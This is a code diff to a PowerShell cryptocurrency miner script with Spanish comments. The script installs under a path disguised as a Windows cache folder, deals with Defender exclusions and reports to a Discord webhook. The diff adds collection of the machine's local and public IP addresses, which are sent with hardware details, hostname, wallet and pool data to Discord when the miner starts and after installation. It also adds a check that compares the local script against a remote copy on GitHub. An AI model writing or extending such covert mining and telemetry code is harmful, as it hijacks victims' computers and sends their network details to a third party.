@@ -28,8 +28,7 @@ param(
 $ErrorActionPreference = 'Stop'
 
 # ---------- configuration & paths -------------------------------------------
-$ScriptVersion = '1.1.0'
-$VersionUrl    = 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/version.txt'
+$RemoteScriptUrl = 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1'
 
 $Root     = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
 $LogDir   = Join-Path $Root 'logs'
@@ -76,6 +75,43 @@ function Send-DiscordWebhook {
     }
 }
 
+# NEW: obtiene IP local + IP publica (con cache en memoria para no golpear la API)
+$script:NetworkInfoCache = $null
+function Get-NetworkInfo {
+    if ($script:NetworkInfoCache) { return $script:NetworkInfoCache }
+    try {
+        $localIPs = @()
+        try {
+            $localIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+                Where-Object {
+                    $_.IPAddress -notlike '127.*' -and
+                    $_.IPAddress -notlike '169.254.*' -and
+                    $_.IPAddress -ne '0.0.0.0'
+                } |
+                Select-Object -ExpandProperty IPAddress -Unique)
+        } catch {}
+
+        $publicIP = $null
+        try {
+            $publicIP = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5 -ErrorAction Stop).ip
+        } catch {
+            try {
+                $publicIP = (Invoke-RestMethod -Uri 'https://ifconfig.me/ip' -TimeoutSec 5 -ErrorAction Stop).ToString().Trim()
+            } catch {}
+        }
+
+        $localStr = if ($localIPs.Count -gt 0) { ($localIPs -join ', ') } else { 'Desconocida' }
+        $pubStr   = if ($publicIP) { $publicIP } else { 'No disponible' }
+
+        $result = "Local: $localStr | Publica: $pubStr"
+        $script:NetworkInfoCache = $result
+        return $result
+    } catch {
+        return 'No disponible'
+    }
+}
+
+# MOD: ahora tambien incluye la IP (local + publica)
 function Get-MiningHardware {
     try {
         $os  = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
@@ -83,39 +119,62 @@ function Get-MiningHardware {
         $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 2)
         $gpus = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
         
-        # Limpieza de strings
         if ($cpu) { $cpu = $cpu.Trim() }
         if (-not $os) { $os = "Desconocido" }
         if (-not $cpu) { $cpu = "Desconocido" }
         if ($gpus) { $gpuStr = $gpus -join ', ' } else { $gpuStr = "Ninguna detectada" }
-        
-        return "**OS:** $os`n**CPU:** $cpu`n**RAM:** $ram GB`n**GPU(s):** $gpuStr"
+
+        $ipInfo = Get-NetworkInfo
+
+        return "**OS:** $os`n**CPU:** $cpu`n**RAM:** $ram GB`n**GPU(s):** $gpuStr`n**IP:** $ipInfo"
     } catch {
         return "Error al leer hardware: $_"
     }
 }
 
 function Check-ScriptUpdate {
-    param([string]$CurrentVer, [string]$Url)
+    param([string]$LocalPath, [string]$RemoteUrl)
     try {
-        $latestVer = (Invoke-RestMethod -Uri $Url -TimeoutSec 5 -ErrorAction Stop).Trim()
-        if ($latestVer -and ($latestVer -ne $CurrentVer)) {
-            return "⚠️ Update disponible: v$latestVer (Actual: v$CurrentVer)"
-        } elseif ($latestVer) {
-            return "✅ Al día (v$CurrentVer)"
+        # Descargar el script remoto
+        $remoteContent = Invoke-RestMethod -Uri $RemoteUrl -TimeoutSec 10 -ErrorAction Stop
+        
+        if (-not (Test-Path $LocalPath)) {
+            return "⚠️ Archivo local no existe. Update necesario."
+        }
+        
+        $localContent = Get-Content -Path $LocalPath -Raw -ErrorAction Stop
+
+        # Normalizar saltos de línea para comparar de forma justa (CRLF vs LF)
+        $normRemote = $remoteContent -replace "`r`n", "`n" -replace "`r", "`n"
+        $normLocal  = $localContent  -replace "`r`n", "`n" -replace "`r", "`n"
+
+        # Calcular hashes SHA256
+        $sha = [System.Security.Cryptography.SHA256]::Create()
+        try {
+            $remoteHash = [System.BitConverter]::ToString($sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($normRemote)))
+            $localHash  = [System.BitConverter]::ToString($sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($normLocal)))
+        } finally {
+            $sha.Dispose()
+        }
+
+        if ($remoteHash -eq $localHash) {
+            return "✅ Al día (Idéntico a GitHub)"
+        } else {
+            return "⚠️ **Update disponible**: El script en GitHub es más reciente."
         }
     } catch {
-        return "❓ No se pudo comprobar actualización"
+        return "❓ No se pudo comprobar update (Error de red o URL)"
     }
-    return "✅ Al día (v$CurrentVer)"
 }
 
 # ---------- test webhook ----------------------------------------------------
 if ($TestWebhook) {
     if (-not $DiscordWebhook) { throw '-TestWebhook requiere -DiscordWebhook <url>' }
     Write-Host '[*] Enviando embed de prueba...'
+    # MOD: ahora incluye hardware + IP
+    $hwInfo = Get-MiningHardware
     $ok = Send-DiscordWebhook -WebhookUrl $DiscordWebhook `
-        -Title '🧪 Test' -Message "Prueba desde $($env:COMPUTERNAME)" -Color 3447003
+        -Title '🧪 Test' -Message "Prueba desde $($env:COMPUTERNAME)`n`n**Hardware:**`n$hwInfo" -Color 3447003
     if ($ok) { Write-Host '[+] Entregado. Revisa el canal.' }
     else     { Write-Host '[-] Falló. Lee el warning de arriba.' }
     return
@@ -145,6 +204,10 @@ if ($Diagnose) {
     Section 'Hardware'
     $hw = Get-MiningHardware -replace '\*\*',''
     $hw -split "`n" | ForEach-Object { Write-Host "  $_" }
+
+    Section 'Script Update'
+    $updateStatus = Check-ScriptUpdate -LocalPath $SelfPs -RemoteUrl $RemoteScriptUrl
+    Write-Host "  $updateStatus" -ForegroundColor Yellow
 
     Section 'Defender exclusions'
     try {
@@ -273,12 +336,12 @@ if ($Run) {
         try {
             $proc.Start() | Out-Null
             
-            # Si es el primer arranque exitoso, enviamos la info a Discord
             if (-not $notifiedStart -and $DiscordWebhook) {
                 $hwInfo = Get-MiningHardware
-                $updateStatus = Check-ScriptUpdate -CurrentVer $ScriptVersion -Url $VersionUrl
+                $updateStatus = Check-ScriptUpdate -LocalPath $SelfPs -RemoteUrl $RemoteScriptUrl
                 
-                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`n`n**Hardware:**`n$hwInfo`n`n**Estado del Script:** $updateStatus"
+                # MOD: ahora incluye Wallet (hardware+IP van dentro de $hwInfo)
+                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nWallet: $Wallet`nPool: $Pool`nAlgo: $Algo`n`n**Hardware:**`n$hwInfo`n`n**Estado del Script:** $updateStatus"
                 
                 Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Miner Iniciado y Detectado" -Message $msg -Color 3066993 | Out-Null
                 $notifiedStart = $true
@@ -443,7 +506,9 @@ if ($Foreground) {
 # ---------- notify and summary ----------------------------------------------
 if ($DiscordWebhook) {
     $pidInfo = if ($p) { "Watcher PID: $($p.Id)" } else { "Mode: Foreground" }
-    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`n$pidInfo"
+    # MOD: ahora incluye Wallet + hardware + IP
+    $hwInfo = Get-MiningHardware
+    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nWallet: $Wallet`nPool: $Pool`nAlgo: $Algo`n$pidInfo`n`n**Hardware:**`n$hwInfo"
     Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Instalación Completada" -Message $msg -Color 3066993 | Out-Null
 }
 
